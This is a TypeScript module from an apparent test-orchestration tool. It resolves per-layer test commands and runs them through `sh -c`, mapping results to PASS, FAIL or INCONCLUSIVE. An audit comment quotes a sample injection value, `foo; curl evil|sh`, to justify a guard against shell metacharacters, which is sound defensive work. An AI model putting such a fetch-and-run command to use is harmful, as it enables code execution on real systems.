/**
 * Delegate runners (ADR-0006 Req3 / Change 3) — extracted from accept-driver.ts
 * (P3-1 god-file split).
 *
 * Thin shells that delegate to the PROJECT's own test command via forge_exec.
 * They never start a browser or hit a real API — they route the AC to the
 * project's existing runner and let aggregateVerdicts do the rest. When no
 * suite is configured, they return INCONCLUSIVE (honest, non-blocking) with a
 * recipe pointer, rather than masking the gap with a silent SKIP.
 */

import type { Scenario } from "../accept.js";
import { isComplexCommand } from "../destructive-guard.js";
import type { Runner, RunnerContext } from "./artifact.js";
import { makeArtifact } from "./artifact.js";
import { checkContractFresh, readContractSource } from "./contract-fresh.js";
import { execDescriptor } from "./http-probe.js";

export type DelegateLayer = "unit" | "component" | "contract";

export interface DelegateConfig {
  /** Explicit command overrides from .forge/config.md `test_commands`. */
  testCommands?: Partial<Record<DelegateLayer, string>>;
  /** Detected package manager (pnpm/npm/yarn) for convention fallback. */
  packageManager?: string;
  /** Per-exec timeout seconds for a single forge_exec (Req3 AC9, default 60). */
  delegateTimeout?: number;
}

/** Recipe pointer shown when a delegate finds no configured suite (Req3 AC4). */
export function recipeHint(layer: DelegateLayer): string {
  const recipes: Record<DelegateLayer, string> = {
    unit: "vitest:unit",
    component: "vue3-vitest-msw / react-vitest-msw",
    contract: "bash:contract",
  };
  return `${layer} suite not configured — run \`/forge init --recipe ${recipes[layer]}\` to generate the scaffold`;
}

/**
 * Resolve the test command for a delegate layer (Req3 AC3). Pure.
 * Priority: explicit test_commands → convention `<pkg> run test:<layer>`.
 */
export function resolveTestCommand(
  layer: DelegateLayer,
  cfg: DelegateConfig,
  evidencePath?: string,
): string {
  // Audit P3-latent-B (2026-07-16): evidencePath is spliced onto the test
  // command and later run via `sh -c`. It is extracted from a scenario's
  // Evidence: line, so it must be a path — never shell operators. Reject
  // metacharacters up front so an Evidence line like `foo; curl evil|sh` can't
  // reach the shell. Currently dead code, but guard now (SR-2).
  if (evidencePath !== undefined && isComplexCommand(evidencePath)) {
    throw new Error(
      `refused: evidencePath contains shell metacharacters/operators (injection guard): "${evidencePath}"`,
    );
  }
  const explicit = cfg.testCommands?.[layer];
  if (explicit) {
    return evidencePath ? `${explicit} ${evidencePath}` : explicit;
  }
  const pkg = cfg.packageManager ?? "npm";
  const cmd = `${pkg} run test:${layer}`;
  return evidencePath ? `${cmd} ${evidencePath}` : cmd;
}

/** Build a delegate Runner for one layer. Shared factory avoids triplication. */
function makeDelegateRunner(layer: DelegateLayer): Runner {
  return {
    type: layer,
    supports: (scenario) => scenario.type === layer,
    run: async (scenario, ctx) => {
      // Resolve config + command. In the unit-test seam we never actually exec;
      // the real exec path is exercised via integration tests. INCONCLUSIVE is
      // the safe default when the project has no suite configured.
      const cfg = readDelegateConfig(ctx);
      const timeoutSec = cfg.delegateTimeout ?? 60;

      // Contract layer: verify the artifact is fresh before delegating (AC7/AC8).
      if (layer === "contract") {
        const source = readContractSource(scenario);
        const artifactPath = extractEvidencePath(scenario);
        if (artifactPath && (source === "pont" || source === "openapi")) {
          const fresh = checkContractFresh({ source, artifactPath });
          if (!fresh.fresh) {
            return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], fresh.reason);
          }
        }
      }

      const evidencePath = extractEvidencePath(scenario);
      const command = resolveTestCommand(layer, cfg, evidencePath ?? undefined);

      try {
        const result = await execDescriptor(
          { executable: "sh", args: ["-c", command] },
          timeoutSec * 1000,
        );
        // exit 0 (execDescriptor resolves) → PASS.
        return makeArtifact(scenario, ctx, "PASS", [command, tail(result.stdout)], undefined);
      } catch (e) {
        const msg = String((e as Error).message ?? e);
        // Non-zero exit → FAIL; crash/timeout → INCONCLUSIVE.
        if (/non-zero exit|exit code|status:/.test(msg)) {
          return makeArtifact(scenario, ctx, "FAIL", [command, msg], msg);
        }
        // Timeout (Req3 AC9) or crash (AC5) → INCONCLUSIVE.
        if (/timeout|timed out/i.test(msg)) {
          return makeArtifact(
            scenario,
            ctx,
            "INCONCLUSIVE",
            [],
            `delegate timeout after ${timeoutSec}s`,
          );
        }
        // No suite configured / command not found → INCONCLUSIVE + recipe hint (AC4/AC5).
        return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], recipeHint(layer));
      }
    },
  };
}

export const unitRunner: Runner = makeDelegateRunner("unit");
export const componentRunner: Runner = makeDelegateRunner("component");
export const contractRunner: Runner = makeDelegateRunner("contract");

/** Read delegate config from the RunnerContext (test seam) or .forge/config.md. */
function readDelegateConfig(ctx: RunnerContext): DelegateConfig {
  // Test seam: allow ctx to carry injected config; otherwise read from disk.
  const injected = (ctx as RunnerContext & { delegateConfig?: DelegateConfig }).delegateConfig;
  if (injected) return injected;
  try {
    const { readFileSync } = require("node:fs") as typeof import("node:fs");
    const { join } = require("node:path") as typeof import("node:path");
    const cfgPath = join(ctx.projectRoot, ".forge", "config.md");
    const cfg = readFileSync(cfgPath, "utf8");
    const pkgMatch = cfg.match(/packageManager:\s*"?(\w+)"?/);
    return {
      packageManager: pkgMatch?.[1],
      testCommands: parseTestCommands(cfg),
    };
  } catch {
    return {};
  }
}

function parseTestCommands(cfg: string): Partial<Record<DelegateLayer, string>> {
  const out: Partial<Record<DelegateLayer, string>> = {};
  const block = cfg.match(/test_commands:\s*\n([\s\S]*?)(?=\n\S|\n---|\n##|$)/);
  if (!block) return out;
  for (const layer of ["unit", "component", "contract"] as const) {
    const m = block[1].match(new RegExp(`${layer}:\\s*"?([^"\\n]+)"?`));
    if (m) out[layer] = m[1].trim();
  }
  return out;
}

function extractEvidencePath(scenario: Scenario): string | null {
  const m = scenario.rawText.match(/Evidence:\s*([^\n]+)/i);
  if (!m) return null;
  return m[1]
    .replace(/\([^)]*\)/g, "")
    .split(",")[0]
    .trim();
}

function tail(s: string, max = 500): string {
  return s.length > max ? `...${s.slice(-max)}` : s;
}
